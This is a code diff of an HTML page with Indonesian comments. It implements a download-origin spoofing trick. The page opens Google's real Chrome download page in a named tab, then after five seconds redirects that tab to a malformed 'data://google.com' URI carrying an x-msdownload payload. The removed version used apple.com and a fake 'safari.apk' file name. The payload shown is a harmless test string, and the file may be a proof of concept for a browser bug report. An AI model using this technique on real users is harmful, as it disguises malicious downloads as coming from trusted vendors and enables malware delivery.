@@ -18,30 +18,13 @@
  </head>
  <body>
   <script>
-    // Download helper menggunakan malformed data URI
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      
-      // Menargetkan window 'x' untuk mempertahankan konteks spoofing
-      link.target = "x"; 
-      
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-
     function a(){
-      // 1. Buka situs asli di window/tab baru bernama 'x'
+      // 1. Buka situs asli di tab baru dengan nama target 'x'
       window.open('https://www.google.com/intl/id_id/chrome/', 'x');
       
-      // 2. Tunggu 5 detik, lalu jalankan trik download
+      // 2. Tunggu 5 detik, lalu paksa tab 'x' tersebut untuk menavigasi ke malformed data URL
       setTimeout(function(){
-        Puf(
-          "data://apple.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-          "safari.apk"
-        );
+        window.open('data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=', 'x');
       }, 5000);
     }
   </script>
